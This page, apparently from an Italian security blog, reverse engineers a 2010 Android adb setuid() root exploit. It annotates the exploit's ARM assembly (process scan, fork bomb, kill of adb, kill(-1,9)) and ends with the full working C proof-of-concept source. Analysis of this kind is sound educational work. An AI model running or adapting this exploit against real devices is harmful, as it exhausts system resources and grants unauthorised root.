@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FORK FLOOD ~ HCF</title>
+<link rel="icon" type="image/png" href="favicon.png">
+<link rel="stylesheet" href="hcf.css">
+</head>
+<body>
+<div class="wrapper">
+<img src="https://spaghetti-hacker.github.io/fork_flood.png" alt="banner" style="width:100%;display:block;">
+<div id="output"></div>
+</div>
+
+<!--
+================================================================
+SCRIVI QUI IL TUO CONTENUTO
+================================================================
+
+REGOLE:
+  - La prima riga non vuota diventa il titolo della pagina
+    e l'intestazione del box (es. "NO_ELF ~ HCF")
+
+  - @@@...@@@ → blocco codice/assembly (pre-wrap, sfondo scuro)
+
+  - Testo normale → commento (colore muted, paragrafi separati
+    da righe vuote)
+
+  - I link si scrivono normalmente in HTML: <a href="...">testo</a>
+    Il parser li lascia passare nei commenti senza escapare.
+
+  - Tutto il contenuto finisce dentro un unico div.article,
+    esattamente come in no_elf.html.
+
+================================================================
+ESEMPIO:
+
+NO_ELF ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+
+;primo commento introduttivo.
+
+;secondo paragrafo del commento.
+
+@@@
+0x00400806 push rbp
+0x00400807 mov rbp, rsp
+@@@
+
+;commento sul blocco qui sopra.
+
+@@@
+0x004008ea ret
+@@@
+
+;commento finale.
+<a href="https://spaghetti-hacker.github.io/">&lt;&lt;</a>
+================================================================
+-->
+<script id="content" type="text/plain">
+FORK FLOOD ~ HCF
+
+<a href="https://spaghetti-hacker.github.io/">«</a>
+
+Analisi malware Android tramite reverse engineering
+
+;l'analisi di questo campione malware è stata condotta attraverso un processo di reverse engineering sul codice assembly, con l'obiettivo di ricostruire il comportamento reale del binario senza alcun accesso al codice sorgente originale. Il lavoro non si è basato su ipotesi astratte, ma sull'osservazione diretta delle istruzioni macchina, delle chiamate di sistema e delle interazioni con il sistema operativo.
+
+;il comportamento emerge dalla lettura del flusso assembly: gestione dei processi, accesso al filesystem virtuale di Linux tramite /proc, utilizzo delle syscall e manipolazione delle risorse del sistema.
+
+;il risultato è la ricostruzione di un malware che non si limita a sfruttare una singola vulnerabilità classica, ma agisce alterando progressivamente le condizioni operative del sistema fino a renderlo instabile e vulnerabile a una race condition durante la gestione di adb.
+
+;Ditto è un Pokémon particolare, privo di una forma propria stabile. Non combatte attraverso una struttura rigida, ma attraverso la capacità di replicare ciò che osserva. La sua forza non deriva da una strategia aggressiva diretta, ma dall'adattamento e dalla copia del contesto circostante. È una entità che non impone una forma, ma la assume, la riflette e la moltiplica/altera.
+
+;il comportamento del malware emerge in modo progressivo e coerente lungo tutta la sua esecuzione. La prima fase è caratterizzata da una ricognizione attiva del sistema. Il codice esplora l'elenco dei processi leggendo iterativamente le directory sotto /proc, cercando di individuare un processo specifico, in particolare quello associato ad adb. Il malware costruisce una mappa dello stato corrente del sistema prima di intervenire.
+
+;in particolare analizza dinamicamente i cmdline dei processi attivi:
+
+@@@
+0x00008698  add r3, pc, r3   ; 0x8aa4 ; "/proc/%d/cmdline"
+0x0000869c  mov r1, r3       ; const char *format
+0x000086a0  ldr r2, [var_10h]; PID corrente (contatore)
+0x000086a4  bl sym.imp.sprintf
+@@@
+
+;questa struttura mostra chiaramente l'intento: enumerare lo spazio dei processi tramite /proc/<pid>/cmdline, costruendo dinamicamente i percorsi per ogni PID. Il malware apre ogni entry di /proc, legge il contenuto di cmdline e verifica la presenza di un target specifico, in questo caso il processo adb.
+
+;la lettura dei processi avviene in modo diretto attraverso syscall:
+
+@@@
+0x000086ac  mov r0, r3       ; const char *path  → "/proc/<pid>/cmdline"
+0x000086b0  mov r1, 0        ; O_RDONLY
+0x000086b4  bl sym.imp.open
+@@@
+
+@@@
+0x000086e4  ldr r0, [fildes]
+0x000086e8  mov r1, r3       ; buf
+0x000086ec  mov r2, 0xff     ; nbyte = 255
+0x000086f0  bl sym.imp.read
+0x000086f4  ldr r0, [fildes]
+0x000086f8  bl sym.imp.close
+@@@
+
+@@@
+0x00008708  add r3, pc, r3   ; 0x8ab8 ; "/sbin/adb"
+0x0000870c  mov r1, r3       ; const char *s2
+0x00008710  bl sym.imp.strstr
+0x00008718  cmp r3, 0
+0x0000871c  beq 0x8730       ; non trovato → incrementa e continua
+@@@
+
+;una volta individuata la presenza del processo adb, il comportamento si sposta verso la manipolazione delle risorse. Il codice verifica i limiti imposti dal sistema operativo, in particolare il numero massimo di processi consentiti per utente. Questo controllo è fondamentale perché l'intero attacco si basa sulla capacità di saturare tali limiti. Se il sistema non impone vincoli, il malware si interrompe, segno che la sua strategia dipende fortemente da condizioni ambientali precise.
+
+;una volta completata la fase di ricognizione, il comportamento si sposta verso il controllo delle risorse del sistema. Prima di eseguire l'attacco vero e proprio, il malware verifica i limiti imposti dal kernel:
+
+@@@
+0x0000884c  mov r0, #0x6             ; RLIMIT_NPROC
+0x00008850  mov r1, r3
+0x00008854  bl  getrlimit
+@@@
+
+@@@
+0x00008878  cmn r3, #0x1             ; confronta con RLIM_INFINITY
+0x0000887c  bne LAB_00008898         ; se finito → prosegui
+@@@
+
+@@@
+0x00008894  bl  exit                 ; altrimenti termina
+@@@
+
+;questo controllo è essenziale: se non esistono limiti di processo (caso RLIM_INFINITY), l'attacco viene interrotto. Questo dimostra che il malware non è cieco, ma dipende fortemente dalle condizioni ambientali.
+
+;se il limite non esiste (caso RLIM_INFINITY), il malware termina l'esecuzione. Questo dettaglio conferma che l'intero exploit è progettato per funzionare solo in un ambiente con limiti reali sfruttabili.
+
+;successivamente avviene la trasformazione del processo in un'entità indipendente dal terminale. Il malware si sgancia dalla sessione corrente e diventa un processo daemonizzato, perdendo ogni legame con il controllo diretto dell'utente. Questo passaggio è tipico dei malware che vogliono mantenere persistenza e autonomia operativa.
+
+;a questo punto il processo si stacca dal contesto originale e diventa indipendente.
+
+;fork iniziale + daemonizzazione
+
+@@@
+0x00008934  bl  fork          ; fork() > 0 → padre esce
+0x00008940  ble LAB_0000894c
+0x00008944  mov r0, #0x0
+0x00008948  bl  exit          ; il padre termina
+@@@
+
+@@@
+LAB_0000894c:
+0x0000894c  bl  setsid        ; figlio si stacca dal terminale
+0x00008958  bl  pipe          ; crea pipe(pepe) per sincronizzazione
+@@@
+
+;il codice si trasforma in un demone: non dipende più dal terminale e può operare in background. Questa è una fase tipica dei malware che vogliono diventare indipendenti dal terminale e operare in modo persistente.
+
+;il cuore dell'attacco consiste nella generazione massiva di processi. Il sistema viene progressivamente saturato attraverso continue chiamate di fork, fino a raggiungere il limite imposto dal kernel. In questo stato, il sistema operativo si trova in una condizione di estrema pressione sulle risorse disponibili. Non si tratta di un attacco diretto a adb, ma di una strategia indiretta: si modifica il contesto globale fino a rendere instabile il comportamento dei servizi critici.
+
+;la fase successiva è quella realmente distruttiva: la saturazione del sistema attraverso fork ripetuti. Il cuore dell'attacco è la generazione massiva di processi tramite fork ripetuti, fino al raggiungimento del limite di sistema.
+
+;secondo fork → processo fork-bomber
+
+@@@
+0x0000895c  bl  fork          ; if (fork() == 0) → entra nel bomber
+0x00008968  bne LAB_00008a0c  ; padre → salta al blocco read/restart
+@@@
+@@@
+0x00008974  bl  close         ; close(pepe[0])
+@@@
+
+;loop infinito di fork (il cuore della fork-bomb)
+
+@@@
+LAB_00008980:
+0x00008980  bl  fork                  ; p = fork()
+0x00008988  str r3,[local_14]         ; salva p
+@@@
+
+;if (p == 0) → figlio muore subito = zombie
+
+@@@
+0x00008994  bne LAB_000089a0
+0x00008998  mov r0, #0x0
+0x0000899c  bl  exit
+@@@
+
+@@@
+LAB_000089a0:
+@@@
+
+;if (p < 0) → fork fallita, slot esauriti
+
+@@@
+0x000089a4  bge LAB_000089fc          ; se p >= 0 vai a incrementa
+@@@
+
+;fork fallita:
+
+@@@
+0x000089b4  beq LAB_0000897c          ; se new_pids==0, NOP e ricomincia
+@@@
+
+;prima volta che fallisce:
+
+@@@
+0x000089c8  bl  printf                ; "[+] Forked %d childs."
+0x000089d0  str r3,[local_c]          ; new_pids = 0
+0x000089e8  bl  write                 ; write(pepe[1], &c, 1) → segnala padre
+0x000089f4  bl  close                 ; close(pepe[1])
+0x000089f8  b   LAB_00008980          ; continua a forkkare
+@@@
+
+@@@
+LAB_000089fc:
+@@@
+
+;p > 0 → fork riuscita
+
+@@@
+0x00008a00  add r3, r3, #0x1          ; pids++
+0x00008a08  b   LAB_00008980          ; torna al fork
+@@@
+
+;qui il comportamento è chiaro: crescita lineare dei processi fino al limite imposto dal kernel. Non è un attacco diretto a un servizio, ma una pressione sistemica sulle risorse.
+
+;il comportamento risultante è una crescita incontrollata del numero di processi, che porta il kernel a saturare la process table e a entrare in uno stato degradato.
+
+;a questo punto, il processo adb viene terminato. Il sistema tenta di riavviare il servizio, ma lo fa in una condizione alterata, con risorse quasi completamente esaurite e una finestra temporale estremamente fragile. È in questo intervallo che si manifesta la race condition.
+
+;il sistema entra progressivamente in uno stato instabile, dove la scheduling dei processi diventa non deterministica.
+
+;quando il sistema è sufficientemente saturato, il malware interviene direttamente sul processo target:
+
+@@@
+LAB_00008a0c:                         ; blocco del processo padre
+0x00008a2c  bl  read                  ; attende segnale su pipe
+0x00008a34  bl  FUN_00008768          ; restart_adb(adb_pid) → kill(pid,9)
+@@@
+
+;doppio fork per processo "fantasma" permanente
+
+@@@
+0x00008a38  bl  fork
+0x00008a48  bl  fork
+LAB_00008a4c:
+0x00008a50  bl  sleep(0x743C)         ; loop eterno → mantiene slot occupati
+0x00008a54  b   LAB_00008a4c
+@@@
+
+;questo crea un processo "orfano" che dorme indefinitamente mantenendo occupati gli slot anche dopo che il bomber ha finito.
+
+;il processo adb viene terminato forzatamente. Questo non è ancora l'exploit finale, ma il trigger che forza il sistema a ricrearlo in condizioni degradate.
+
+;una volta ucciso adb, il malware non si limita ad attendere passivamente. Entra in una fase di verifica attiva: monitora continuamente lo spazio dei processi cercando un nuovo processo adb con PID diverso da quello originale. Quando lo individua, attende 5 secondi — una finestra calcolata per dare tempo al sistema di tentare l'inizializzazione — e poi invia un SIGKILL broadcast a tutti i processi del sistema.
+
+;con il relativo snippet assembly da FUN_0000878c:
+
+;loop di attesa: cerca adb con PID diverso dall'originale
+
+@@@
+0x000087a4  bl  FUN_0000865c       ; find_adb() → scansiona /proc
+0x000087b4  cmp r3, #0x0
+0x000087b8  beq 0x87e8             ; non trovato → sleep(1) e riprova
+0x000087c4  cmp r2, r3             ; trovato == vecchio PID?
+0x000087c8  beq 0x87e8             ; sì → sleep(1) e riprova
+@@@
+
+;nuovo adb trovato → attendi e uccidi tutto
+
+@@@
+0x000087cc  mov r0, #5
+0x000087d0  bl  sleep              ; sleep(5)
+0x000087d4  mvn r0, #0             ; pid = -1 (tutti i processi)
+0x000087d8  mov r1, #9             ; SIGKILL
+0x000087dc  bl  kill               ; kill(-1, 9)
+@@@
+
+;il kill(-1, 9) è il momento terminale dell'exploit: un segnale broadcast che colpisce tutti i processi dell'utente corrente. Se setuid() non è riuscito nel nuovo adb a causa della saturazione, il processo è rimasto con privilegi elevati — e in quello stato viene lasciato operare dopo che il broadcast ha eliminato tutto il resto.
+
+;le risorse sono ormai vicine al limite e il comportamento del sistema non è più deterministico. È in questa fase che si crea la finestra di race condition.
+
+;la chiamata a setuid() avviene internamente al processo adb al riavvio, fuori dal codice di questo binario
+
+;in condizioni normali, questa chiamata riduce i privilegi del processo. Tuttavia, in uno stato di saturazione e race condition, la sequenza di inizializzazione può non comportarsi in modo affidabile, creando la finestra di exploit.
+
+;il nuovo processo adb, durante la sua inizializzazione, dovrebbe eseguire operazioni di deprivilegiamento tramite setuid. Tuttavia, a causa dello stato del sistema, questa transizione non avviene correttamente. Il risultato è che il processo può rimanere in uno stato privilegiato, generando l'effetto desiderato dall'exploit.
+
+;l'intero meccanismo non si basa quindi su una singola vulnerabilità isolata, ma su una concatenazione di processi: saturazione delle risorse, temporizzazione, riavvio del servizio e comportamento non deterministico del sistema operativo sotto stress.
+
+;conclusione
+
+;questo malware non segue il modello classico degli exploit basati  su corruzione della memoria o esecuzione diretta di codice arbitrario.
+Non colpisce una singola vulnerabilità, ma altera il sistema nel suo insieme fino a modificarne il comportamento emergente.
+
+;il paragone con Ditto diventa quindi particolarmente preciso.
+
+;come Ditto, il malware non ha una forma rigida. Non attacca direttamente, ma si adatta al contesto che osserva. Replica lo stato
+del sistema, ne sfrutta le regole interne e le porta al limite fino a farle collassare. La sua forza non sta nella violenza dell'attacco,
+ma nella capacità di trasformare il sistema stesso nel vettore dell'exploit. Non rompe le regole: le porta semplicemente al punto
+in cui iniziano a lavorare contro sé stesse.
+
+;entrambi condividono una caratteristica fondamentale: la forza non risiede in un attacco diretto, ma nella capacità di trasformare il
+contesto fino a renderlo favorevole. Il sistema non viene violato nel senso tradizionale del termine, ma viene portato in una condizione
+in cui le sue stesse dinamiche interne producono il risultato desiderato.
+
+
+<pre>/* android 1.x/2.x adb setuid() root exploit
+ * (C) 2010 The Android Exploid Crew
+ *
+ * Needs to be executed via adb -d shell. It may take a while until
+ * all process slots are filled and the adb connection is reset.
+ *
+ * !!!This is PoC code for educational purposes only!!!
+ * If you run it, it might crash your device and make it unusable!
+ * So you use it at your own risk!
+ */
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <string.h>
+#include <signal.h>
+#include <stdlib.h>
+
+
+void die(const char *msg)
+{
+	perror(msg);
+	exit(errno);
+}
+
+pid_t find_adb()
+{
+	char buf[256];
+	int i = 0, fd = 0;
+	pid_t found = 0;
+
+	for (i = 0; i < 32000; ++i) {
+		sprintf(buf, "/proc/%d/cmdline", i);
+		if ((fd = open(buf, O_RDONLY)) < 0)
+			continue;
+		memset(buf, 0, sizeof(buf));
+		read(fd, buf, sizeof(buf) - 1);
+		close(fd);
+		if (strstr(buf, "/sbin/adb")) {
+			found = i;
+			break;
+		}
+        }
+        return found;
+}
+
+
+void restart_adb(pid_t pid)
+{
+	kill(pid, 9);
+}
+
+
+void wait_for_root_adb(pid_t old_adb)
+{
+	pid_t p = 0;
+
+	for (;;) {
+		p = find_adb();
+		if (p != 0 && p != old_adb)
+			break;
+		sleep(1);
+	}
+	sleep(5);
+	kill(-1, 9);
+}
+
+
+int main(int argc, char **argv)
+{
+	pid_t adb_pid = 0, p;
+	int pids = 0, new_pids = 1;
+	int pepe[2];
+	char c = 0;
+	struct rlimit rl;
+
+	printf("[*] CVE-2010-EASY Android local root exploit (C) 2010 by 743C\n\n");
+	printf("[*] checking NPROC limit ...\n");
+
+	if (getrlimit(RLIMIT_NPROC, &rl) < 0)
+		die("[-] getrlimit");
+
+	if (rl.rlim_cur == RLIM_INFINITY) {
+		printf("[-] No RLIMIT_NPROC set. Exploit would just crash machine. Exiting.\n");
+		exit(1);
+	}
+
+	printf("[+] RLIMIT_NPROC={%lu, %lu}\n", rl.rlim_cur, rl.rlim_max);
+	printf("[*] Searching for adb ...\n");
+
+	adb_pid = find_adb();
+
+	if (!adb_pid)
+		die("[-] Cannot find adb");
+
+	printf("[+] Found adb as PID %d\n", adb_pid);
+	printf("[*] Spawning children. Dont type anything and wait for reset!\n");
+	printf("[*]\n[*] If you like what we are doing you can send us PayPal money to\n"
+	       "[*] 7-4-3-C@web.de so we can compensate time, effort and HW costs.\n"
+	       "[*] If you are a company and feel like you profit from our work,\n"
+	       "[*] we also accept donations > 1000 USD!\n");
+	printf("[*]\n[*] adb connection will be reset. restart adb server on desktop and re-login.\n");
+
+	sleep(5);
+
+	if (fork() > 0)
+		exit(0);
+
+	setsid();
+	pipe(pepe);
+
+	/* generate many (zombie) shell-user processes so restarting
+	 * adb's setuid() will fail.
+	 * The whole thing is a bit racy, since when we kill adb
+	 * there is one more process slot left which we need to
+	 * fill before adb reaches setuid(). Thats why we fork-bomb
+	 * in a seprate process.
+	 */
+	if (fork() == 0) {
+		close(pepe[0]);
+		for (;;) {
+			if ((p = fork()) == 0) {
+				exit(0);
+			} else if (p < 0) {
+				if (new_pids) {
+					printf("\n[+] Forked %d childs.\n", pids);
+					new_pids = 0;
+					write(pepe[1], &c, 1);
+					close(pepe[1]);
+				}
+			} else {
+				++pids;
+			}
+		}
+	}
+
+	close(pepe[1]);
+	read(pepe[0], &c, 1);
+
+
+	restart_adb(adb_pid);
+
+	if (fork() == 0) {
+		fork();
+		for (;;)
+			sleep(0x743C);
+	}
+
+	wait_for_root_adb(adb_pid);
+	return 0;
+}</pre>
+
+<a href="https://spaghetti-hacker.github.io/">«</a>
+</script>
+
+<script>
+(function(){
+    const raw = document.getElementById('content').textContent;
+    const lines = raw.split('\n');
+    const output = document.getElementById('output');
+
+    let i = 0;
+
+    // salta righe vuote iniziali
+    while(i < lines.length && lines[i].trim() === '') i++;
+
+    // prima riga non vuota = titolo
+    const title = lines[i] ? lines[i].trim() : '';
+    if(title){
+        document.title = title + ' | HCF';
+    }
+    i++;
+
+    // costruisce il contenuto dentro un unico div.article
+    // il titolo è il nodo di testo iniziale del box
+    let inner = escCode(title);
+    i; // già avanzato
+
+    while(i < lines.length){
+        const line = lines[i];
+
+        // blocco @@@ → codice pre-wrap
+        if(line.trim() === '@@@'){
+            i++;
+            let block = '';
+            while(i < lines.length && lines[i].trim() !== '@@@'){
+                block += lines[i] + '\n';
+                i++;
+            }
+            i++; // salta @@@ di chiusura
+            // il codice viene escapato tranne &lt; &gt; &amp; già scritti
+            inner += escCode(block.replace(/\n$/, ''));
+            continue;
+        }
+
+        // raccoglie testo fino al prossimo @@@
+        let textLines = [];
+        while(i < lines.length && lines[i].trim() !== '@@@'){
+            textLines.push(lines[i]);
+            i++;
+        }
+
+        const paragraphs = splitParagraphs(textLines);
+        if(paragraphs.length > 0){
+	    inner += '<div class="commento">\n';
+            for (const p of paragraphs){
+                const cleaned = p.replace(/\n/g, '<br>');
+                inner += '<p>' + cleaned + '</p>\n';
+                }
+            inner += '</div>';
+        }
+    }
+
+    output.innerHTML = '<div class="article">' + inner + '</div>';
+
+    // escapa solo il testo codice (non i commenti che possono avere HTML)
+    function escCode(str){
+        return str
+            .replace(/&(?!(?:amp|lt|gt|quot|#\d+);)/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;');
+    }
+
+    function splitParagraphs(lines){
+        const result = [];
+        let current = [];
+        for(const line of lines){
+            if(line.trim() === ''){
+                if(current.length > 0){
+                    result.push(current.join('\n'));
+                    current = [];
+                }
+            } else {
+                current.push(line);
+            }
+        }
+        if(current.length > 0) result.push(current.join('\n'));
+        return result;
+    }
+})();
+</script>
+</body>
+</html>
